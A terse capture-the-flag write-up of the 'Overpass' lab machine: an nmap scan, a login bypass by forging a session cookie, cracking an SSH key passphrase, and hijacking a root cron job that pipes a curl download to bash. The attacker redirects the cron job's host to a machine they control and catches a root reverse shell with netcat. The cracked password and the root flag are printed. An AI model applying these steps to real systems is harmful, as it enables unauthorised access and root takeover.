```bash
┌──(kali㉿kali)-[~]
└─$ nmap 10.10.241.12                                           
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-25 11:30 EDT
Nmap scan report for 10.10.241.12
Host is up (0.10s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 16.07 seconds
```


source code hints to roman cipher,,, google says:

dirsearch gave us admin directory   


Caesar Shift Cipher
The Romans used the Caesar Shift Cipher method to encrypt their messages. In this method, the sender and the receiver agreed on a number and used it to shift letters, thus writing a message using the letter-shift.


Alex helped me out, 

you had to make a cookie, js file was clearly saying this,, 
```js
async function login() {
    const usernameBox = document.querySelector("#username");
    const passwordBox = document.querySelector("#password");
    const loginStatus = document.querySelector("#loginStatus");
    loginStatus.textContent = ""
    const creds = { username: usernameBox.value, password: passwordBox.value }
    const response = await postData("/api/login", creds)
    const statusOrCookie = await response.text()
    if (statusOrCookie === "Incorrect credentials") {
        loginStatus.textContent = "Incorrect Credentials"
        passwordBox.value=""
    } else {
        Cookies.set("SessionToken",statusOrCookie)
        window.location = "/admin"
    }
}
```

we get ssh key run ssh2john and then john 


passcode:james13


in crontabs, 


finished it with 1trick and hellfire

```bash
james@overpass-prod:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
# Update builds from latest code
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
```

we ran linpeas,, 

put my ip in hosts file for overpass.thm

made shell, set up listner and served it ,, 
```bash
──(kali㉿kali)-[/hackme/scripts]
└─$ nc -lnvp 9001                              
listening on [any] 9001 ...
connect to [10.6.65.43] from (UNKNOWN) [10.10.241.12] 55554
sh: 0: can't access tty; job control turned off
# whoami
root
# cat /root/root.txt
thm{7f336f8c359dbac18d54fdd64ea753bb}
```